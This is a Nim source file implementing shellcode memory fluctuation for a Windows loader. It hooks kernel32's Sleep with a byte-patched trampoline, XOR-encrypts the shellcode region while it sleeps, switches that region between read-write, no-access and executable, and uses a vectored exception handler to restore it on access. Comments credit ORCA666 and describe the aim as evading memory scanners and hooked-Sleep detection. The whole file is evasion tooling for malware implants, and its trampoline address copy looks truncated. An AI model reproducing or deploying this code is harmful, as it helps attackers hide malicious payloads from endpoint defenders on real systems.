import winim
import ptr_math

type
    typeSleep* = proc (dwMilliseconds: DWORD): void {.stdcall.}


type
  TypeOfFluctuation* = enum
    NoFluctuation = 0, FluctuateToRW, FluctuateToNA ##  ORCA666's delight: https://github.com/ORCA666/0x41

type
    MyNtFlushInstructionCache* = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, NumberofBytestoFlush: ULONG): NTSTATUS {.stdcall.}


when defined(amd64):
    type
        FluctuationMetadata* {.bycopy.} = object
          shellcodeAddr*: LPVOID
          shellcodeSize*: SIZE_T
          currentlyEncrypted*: bool
          encodeKey*: int64
          protect*: DWORD
when defined(i386):
    type
        FluctuationMetadata* {.bycopy.} = object
          shellcodeAddr*: LPVOID
          shellcodeSize*: SIZE_T
          currentlyEncrypted*: bool
          encodeKey*: DWORD
          protect*: DWORD
type
  HookedSleep* {.bycopy.} = object
    origSleep*: typeSleep
    sleepStub*: array[16, BYTE]

  HookTrampolineBuffers* {.bycopy.} = object
    originalBytes*: HANDLE    ##  (Input) Buffer containing bytes that should be restored while unhooking.
    originalBytesSize*: DWORD  ##  (Output) Buffer that will receive bytes present prior to trampoline installation/restoring.
    previousBytes*: HANDLE
    previousBytesSize*: DWORD


# No Syscalls for the moment
var ntdlldll = LoadLibraryA("ntdll.dll")
if (ntdlldll == 0):
    echo "[X] Failed to load ntdll.dll"

var NtFlushInstructionCacheAddress = GetProcAddress(ntdlldll,"NtFlushInstructionCache")
if isNil(NtFlushInstructionCacheAddress):
    echo "[X] Failed to get the address of 'NtFlushInstructionCache'"

var NtFlushInstructionCache*: MyNtFlushInstructionCache
NtFlushInstructionCache = cast[MyNtFlushInstructionCache](NtFlushInstructionCacheAddress)

proc hookSleep*(): bool

proc fastTrampoline*(installHook: bool; addressToHook: LPVOID; jumpAddress: LPVOID;
                    buffers: ptr HookTrampolineBuffers = nil): bool

proc xorFunc*(buf: ptr uint32; bufSize: size_t; xorKey: uint32)

proc shellcodeEncryptDecrypt*(callerAddress: LPVOID)

var g_hookedSleep*: HookedSleep

var g_fluctuationData*: FluctuationMetadata

var g_fluctuate*: TypeOfFluctuation

var sleep_Address*: HANDLE

proc MySleep (dwMilliseconds: DWORD): void =
    var caller: LPVOID = g_fluctuationData.shellcodeAddr
 
    # Encrypt (XOR32) shellcode's memory allocation and flip its memory pages to RW
    shellcodeEncryptDecrypt(caller)

    var buffers: HookTrampolineBuffers

    buffers.originalBytes = cast[HANDLE](addr g_hookedSleep.sleepStub[0])
    buffers.originalBytesSize = DWORD(sizeof(g_hookedSleep.sleepStub))
    
    var restoreHandle: HANDLE = cast[HANDLE](addr g_hookedSleep.sleepStub[0])
    #echo "Patch address for restoring:\r\n", toHex(sleep_Address)

    #[
        Unhook kernel32!Sleep to evade hooked Sleep IOC. 
        We leverage the fact that the return address left on the stack will make the thread
        get back to our handler anyway.
    ]#
    var addressToHook: LPVOID = cast[LPVOID](GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep"))
    var trampolinesuccess: bool = fastTrampoline(false, cast[LPVOID](sleep_Address), cast[LPVOID](MySleep), &buffers)
    if (trampolinesuccess == false):
        echo "Failed to install trampoline"
        quit(1)
    # Perform sleep emulating originally hooked functionality.
    echo "Calling real Sleep with\r\n", dwMilliseconds
    Sleep(dwMilliseconds)

    if (g_fluctuate == FluctuateToRW):
        # Restore original memory protection and revert to original shellcode.
        shellcodeEncryptDecrypt(caller);
    else:
        echo "Waiting for VEH Exception"
        #[
         If we fluctuate to PAGE_NOACCESS there is no need to decrypt and revert back memory protections just yet.
         We await for Access Violation exception to occur, catch it and from within the exception handler will adjust 
         its protection to resume execution.
        ]#

    #Re-hook kernel32!Sleep
    trampolinesuccess = fastTrampoline(true, cast[LPVOID](sleep_Address), cast[LPVOID](MySleep), nil)
    #echo "Trampoline success\r\n", trampolinesuccess


proc xorFunc*(buf: ptr uint32; bufSize: size_t; xorKey: uint32) =
  var buf32: ptr uint32 = cast[ptr uint32](buf)
  var bufSizeRounded: auto = (bufSize - (bufSize mod size_t(sizeof((uint32))))) div 4
  var i: size_t = 0
  while i < bufSizeRounded:
    buf32[] = buf32[] xor xorKey
    buf32 = buf32 + 1
    inc(i)

proc fastTrampoline(installHook: bool; addressToHook: LPVOID; jumpAddress: LPVOID;
                    buffers: ptr HookTrampolineBuffers): bool =
    var trampoline: seq[byte]
    if defined(amd64):
        trampoline = @[
            byte(0x49), byte(0xBA), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov r10, addr
            byte(0x00),byte(0x00),byte(0x41), byte(0xFF),byte(0xE2)                                         # jmp r10
        ]
        var tempjumpaddr: uint64 = cast[uint64](jumpAddress)
        copyMem(&trampoline[2] , &tempjumpaddr, 6)
    elif defined(i386):
        trampoline = @[
            byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, addr
            byte(0x00),byte(0x00),byte(0xFF), byte(0xE0)                                      # jmp eax
        ]
        var tempjumpaddr: uint32 = cast[uint32](jumpAddress)
        copyMem(&trampoline[1] , &tempjumpaddr, 3)
    
    var dwSize: DWORD = DWORD(len(trampoline))
    var dwOldProtect: DWORD = 0
    var output: bool = false
    

    if (installHook):
        if (buffers != nil):
            if ((buffers.previousBytes == 0) or buffers.previousBytesSize == 0):
                echo "Previous Bytes == 0"
                return false
            copyMem(unsafeAddr buffers.previousBytes, addressToHook, buffers.previousBytesSize)

        if (VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)):
            #echo "Virtual Protect to RWX success!"
            #echo toHex((&trampoline[0]))
            copyMem(addressToHook, addr trampoline[0], dwSize)
            output = true
    else:
        echo "Restoring old Sleep!"
        echo "Original Bytes restore address: ", toHex(buffers.originalBytes)
        echo "Original Bytes Size: ", buffers.originalBytesSize
        if (buffers != nil):
            if ((buffers.originalBytes == 0) or buffers.originalBytesSize == 0):
                echo "Original Bytes == 0"
                return false

            dwSize = buffers.originalBytesSize

            if (VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)):
                copyMem(addressToHook, cast[LPVOID](buffers.originalBytes), dwSize)
                output = true
    
    var status = NtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize)
    if (status == 0):
        echo "NtFlushInstructionCache success"
    else:
        echo "NtFlushInstructionCache failed: ", toHex(status)
    VirtualProtect(addressToHook, dwSize, dwOldProtect, &dwOldProtect)

    return output

proc hookSleep(): bool =
    var addressToHook: LPVOID = cast[LPVOID](GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep"))
    sleep_Address = cast[HANDLE](addressToHook)
    var buffers: HookTrampolineBuffers
    var output: bool = false
    
    if (addressToHook == nil):
        return false
        
    buffers.previousBytes = cast[HANDLE](addressToHook)
    buffers.previousBytesSize = DWORD(sizeof(addressToHook))
    g_hookedSleep.origSleep = cast[typeSleep](addressToHook)
    var PointerToOrigBytes: LPVOID = addr g_hookedSleep.sleepStub
    copyMem(PointerToOrigBytes, addressToHook, 16)
    #echo "Sleep Stub original bytes:\r\n"
    #echo g_hookedSleep.sleepStub
    #g_hookedSleep.sleepStub = addressToHook
    #echo "MySleep Address: \r\n", repr(MySleep)
    output = fastTrampoline(true, cast[LPVOID](addressToHook), cast[LPVOID](MySleep), &buffers)
    addressToHook = cast[LPVOID](GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep"))
    return output

proc shellcodeEncryptDecrypt(callerAddress: LPVOID): void =
    if ((g_fluctuate != NoFluctuation) and (g_fluctuationData.shellcodeAddr != nil) and (g_fluctuationData.shellcodeSize > 0)):
        #if (not isSHellcodeThread(callerAddress)):
        #    return

        var oldProtection: DWORD = 0

        if ((not g_fluctuationData.currentlyEncrypted) or ((g_fluctuationData.currentlyEncrypted) and (g_fluctuate == FluctuatetoNA))):
            VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, PAGE_READWRITE, &g_fluctuationData.protect)
            echo "Flipped to RW"
        
        if (g_fluctuationData.currentlyEncrypted):
            echo "Decoding..."
        else:
            echo "Encoding"
        
        xorFunc(cast[ptr uint32](g_fluctuationData.shellcodeAddr), size_t(g_fluctuationData.shellcodeSize), uint32(g_fluctuationData.encodeKey))
        
        if ((not g_fluctuationData.currentlyEncrypted) and g_fluctuate == FluctuateToNA):
            #[
              //
              // Here we're utilising ORCA666's idea to mark the shellcode as PAGE_NOACCESS instead of PAGE_READWRITE
              // and our previously set up vectored exception handler should catch invalid memory access, flip back memory
              // protections and resume the execution.
              // 
              // Be sure to check out ORCA666's original implementation here:
              //      https://github.com/ORCA666/0x41/blob/main/0x41/HookingLoader.hpp#L285
              //
            ]#
            echo "Flipping to NA"
            var protectSuccess = VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, PAGE_NOACCESS, &oldProtection)
            echo protectSuccess
            #g_fluctuationData.currentlyEncrypted = true
            #echo "WhatTHe"
            #echo "Flipped to NA"

        elif(g_fluctuationData.currentlyEncrypted):
            VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, g_fluctuationData.protect, &oldProtection)
            echo "Flipped back to RX/RWX"
        
        g_fluctuationData.currentlyEncrypted = (not g_fluctuationData.currentlyEncrypted)


proc VEHHandler (pExceptInfo: PEXCEPTION_POINTERS): LONG =
    var caller: ULONG_PTR
    if (pExceptInfo.ExceptionRecord.ExceptionCode == 0xc0000005):
        when defined(amd64):
            caller = pExceptInfo.ContextRecord.Rip
        when defined(i386):
            caller = pExceptInfo.ContextRecord.Eip
    
    echo "Access Violation at: ", toHex(caller)

    # Check if the exception's instruction pointer (EIP/RIP) points back to our shellcode allocation.
    # If it does, it means our shellcode attempted to run but was unable to due to the PAGE_NOACCESS.

    if ((ULONG(caller) >= cast[ULONG](g_fluctuationData.shellcodeAddr)) and (ULONG(caller) <= cast[ULONG](g_fluctuationData.shellcodeAddr) + g_fluctuationData.shellcodeSize)):
        echo "Shellcode attempted to run but was unable to due to the PAGE_NOACCESS."
        echo "Flipping back to RX/RWX..."
        # We'll now decrypt (XOR32) shellcode's memory allocation and flip its memory pages back to RX.
        
        shellcodeEncryptDecrypt(cast[LPVOID](caller))

        # Tell the system everything's OK and we can carry on.
        return EXCEPTION_CONTINUE_EXECUTION

    echo "Unhandled exception occured. Not the one due to PAGE_NOACCESS"
    # Oops, something else just happened and that wasn't due to our PAGE_NOACCESS trick.
    return EXCEPTION_CONTINUE_SEARCH

